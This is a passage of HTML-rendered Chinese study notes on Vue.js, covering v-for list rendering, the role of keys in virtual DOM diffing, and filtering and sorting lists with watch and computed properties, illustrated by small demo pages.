class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="基本列表"><a href="#基本列表" class="headerlink" title="基本列表"></a>基本列表</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>基本列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">v-for指令:</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.用于展示列表数据</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.语法：v-for=&quot;(item, index) in xxx&quot; :key=&quot;yyy&quot;</span></span></span><br><span class="line"><span class="comment"><span class="xml">3.可遍历：数组、对象、字符串（用的很少）、指定次数（用的很少）</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 遍历数组 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表（遍历数组）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(p,index) of persons&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 遍历对象 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>汽车信息（遍历对象）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(value,k) of car&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;k&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;k&#125;&#125;-&#123;&#123;value&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 遍历字符串 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>测试遍历字符串（用得少）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(char,index) of str&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;char&#125;&#125;-&#123;&#123;index&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 遍历指定次数 --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>测试遍历指定次数（用得少）<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;(number,index) of 5&quot;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;index&#125;&#125;-&#123;&#123;number&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">persons</span>:[</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;001&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;张三&#x27;</span>,<span class="attr">age</span>:<span class="number">18</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;002&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;李四&#x27;</span>,<span class="attr">age</span>:<span class="number">19</span>&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#123;<span class="attr">id</span>:<span class="string">&#x27;003&#x27;</span>,<span class="attr">name</span>:<span class="string">&#x27;王五&#x27;</span>,<span class="attr">age</span>:<span class="number">20</span>&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">],</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">car</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;奥迪A8&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">price</span>:<span class="string">&#x27;70万&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">color</span>:<span class="string">&#x27;黑色&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">str</span>:<span class="string">&#x27;hello&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="key的原理"><a href="#key的原理" class="headerlink" title="key的原理"></a>key的原理</h2><p>使用:key=’index’会出问题</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!-- 准备好一个容器--&gt;</span><br><span class="line">    <span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>人员列表<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click.once</span>=<span class="string">&quot;add&quot;</span>&gt;</span>添加一个老刘<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&#x27;(p,index) in persons&#x27;</span> <span class="attr">:key</span>=<span class="string">&quot;index&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">                &#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202031945326.png" alt="image-20220129175912201"></p><p><img src="https://gitee.com/bluebanister/image/raw/master//img/202202031945682.png" alt="image-20220131121932082"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220131121932082.png" alt="image-20220131121932082"></p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220131122514433.png" alt="image-20220131122514433"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;key的原理&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">面试题：react、vue中的key有什么作用？（key的内部原理）</span><br><span class="line"></span><br><span class="line">1. 虚拟DOM中key的作用：</span><br><span class="line">key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】, </span><br><span class="line">随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：</span><br><span class="line"></span><br><span class="line">2.对比规则：</span><br><span class="line">(1).旧虚拟DOM中找到了与新虚拟DOM相同的key：</span><br><span class="line">①.若虚拟DOM中内容没变, 直接使用之前的真实DOM！</span><br><span class="line">②.若虚拟DOM中内容变了, 则生成新的真实DOM，随后替换掉页面中之前的真实DOM。</span><br><span class="line"></span><br><span class="line">(2).旧虚拟DOM中未找到与新虚拟DOM相同的key</span><br><span class="line">创建新的真实DOM，随后渲染到到页面。</span><br><span class="line"></span><br><span class="line">3. 用index作为key可能会引发的问题：</span><br><span class="line">1. 若对数据进行：逆序添加、逆序删除等破坏顺序操作:</span><br><span class="line">会产生没有必要的真实DOM更新 ==&gt; 界面效果没问题, 但效率低。</span><br><span class="line"></span><br><span class="line">2. 如果结构中还包含输入类的DOM：</span><br><span class="line">会产生错误DOM更新 ==&gt; 界面有问题。</span><br><span class="line"></span><br><span class="line">4. 开发中如何选择key?:</span><br><span class="line">1.最好使用每条数据的唯一标识作为key, 比如id、手机号、身份证号、学号等唯一值。</span><br><span class="line">2.如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示，</span><br><span class="line">使用index作为key是没有问题的。</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;!-- 遍历数组 --&gt;</span><br><span class="line">&lt;h2&gt;人员列表（遍历数组）&lt;/h2&gt;</span><br><span class="line">&lt;button @click.once=&quot;add&quot;&gt;添加一个老刘&lt;/button&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;(p,index) of persons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;</span><br><span class="line">&lt;input type=&quot;text&quot;&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">persons:[</span><br><span class="line">&#123;id:&#x27;001&#x27;,name:&#x27;张三&#x27;,age:18&#125;,</span><br><span class="line">&#123;id:&#x27;002&#x27;,name:&#x27;李四&#x27;,age:19&#125;,</span><br><span class="line">&#123;id:&#x27;003&#x27;,name:&#x27;王五&#x27;,age:20&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">methods: &#123;</span><br><span class="line">add()&#123;</span><br><span class="line">const p = &#123;id:&#x27;004&#x27;,name:&#x27;老刘&#x27;,age:40&#125;</span><br><span class="line">this.persons.unshift(p)</span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="列表过滤"><a href="#列表过滤" class="headerlink" title="列表过滤"></a>列表过滤</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;列表过滤&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;h2&gt;人员列表&lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyWord&quot;&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;(p,index) of filPerons&quot; :key=&quot;index&quot;&gt;</span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">//用watch实现</span><br><span class="line">//#region </span><br><span class="line">/* new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">keyWord:&#x27;&#x27;,</span><br><span class="line">persons:[</span><br><span class="line">&#123;id:&#x27;001&#x27;,name:&#x27;马冬梅&#x27;,age:19,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;002&#x27;,name:&#x27;周冬雨&#x27;,age:20,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;003&#x27;,name:&#x27;周杰伦&#x27;,age:21,sex:&#x27;男&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;004&#x27;,name:&#x27;温兆伦&#x27;,age:22,sex:&#x27;男&#x27;&#125;</span><br><span class="line">],</span><br><span class="line">filPerons:[]</span><br><span class="line">&#125;,</span><br><span class="line">watch:&#123;</span><br><span class="line">keyWord:&#123;</span><br><span class="line">immediate:true,</span><br><span class="line">handler(val)&#123;</span><br><span class="line">this.filPerons = this.persons.filter((p)=&gt;&#123;</span><br><span class="line">return p.name.indexOf(val) !== -1</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;) */</span><br><span class="line">//#endregion</span><br><span class="line"></span><br><span class="line">//用computed实现</span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">keyWord:&#x27;&#x27;,</span><br><span class="line">persons:[</span><br><span class="line">&#123;id:&#x27;001&#x27;,name:&#x27;马冬梅&#x27;,age:19,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;002&#x27;,name:&#x27;周冬雨&#x27;,age:20,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;003&#x27;,name:&#x27;周杰伦&#x27;,age:21,sex:&#x27;男&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;004&#x27;,name:&#x27;温兆伦&#x27;,age:22,sex:&#x27;男&#x27;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line">filPerons()&#123;</span><br><span class="line">return this.persons.filter((p)=&gt;&#123;</span><br><span class="line">return p.name.indexOf(this.keyWord) !== -1</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;) </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="列表排序"><a href="#列表排序" class="headerlink" title="列表排序"></a>列表排序</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;列表排序&lt;/title&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;h2&gt;人员列表&lt;/h2&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;请输入名字&quot; v-model=&quot;keyWord&quot;&gt;</span><br><span class="line">&lt;button @click=&quot;sortType = 2&quot;&gt;年龄升序&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;sortType = 1&quot;&gt;年龄降序&lt;/button&gt;</span><br><span class="line">&lt;button @click=&quot;sortType = 0&quot;&gt;原顺序&lt;/button&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li v-for=&quot;(p,index) of filPerons&quot; :key=&quot;p.id&quot;&gt;</span><br><span class="line">&#123;&#123;p.name&#125;&#125;-&#123;&#123;p.age&#125;&#125;-&#123;&#123;p.sex&#125;&#125;</span><br><span class="line">&lt;input type=&quot;text&quot;&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">keyWord:&#x27;&#x27;,</span><br><span class="line">sortType:0, //0原顺序 1降序 2升序</span><br><span class="line">persons:[</span><br><span class="line">&#123;id:&#x27;001&#x27;,name:&#x27;马冬梅&#x27;,age:30,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;002&#x27;,name:&#x27;周冬雨&#x27;,age:31,sex:&#x27;女&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;003&#x27;,name:&#x27;周杰伦&#x27;,age:18,sex:&#x27;男&#x27;&#125;,</span><br><span class="line">&#123;id:&#x27;004&#x27;,name:&#x27;温兆伦&#x27;,age:19,sex:&#x27;男&#x27;&#125;</span><br><span class="line">]</span><br><span class="line">&#125;,</span><br><span class="line">computed:&#123;</span><br><span class="line">filPerons()&#123;</span><br><span class="line">const arr = this.persons.filter((p)=&gt;&#123;</span><br><span class="line">return p.name.indexOf(this.keyWord) !== -1</span><br><span class="line">&#125;)</span><br><span class="line">//判断一下是否需要排序</span><br><span class="line">if(this.sortType)&#123;</span><br><span class="line">arr.sort((p1,p2)=&gt;&#123;</span><br><span class="line">return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">return arr</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;) </span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="更新时的一个问题"><a href="#更新时的一个问题" class="headerlink" title="更新时的一个问题"></a>更新时的一个问题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 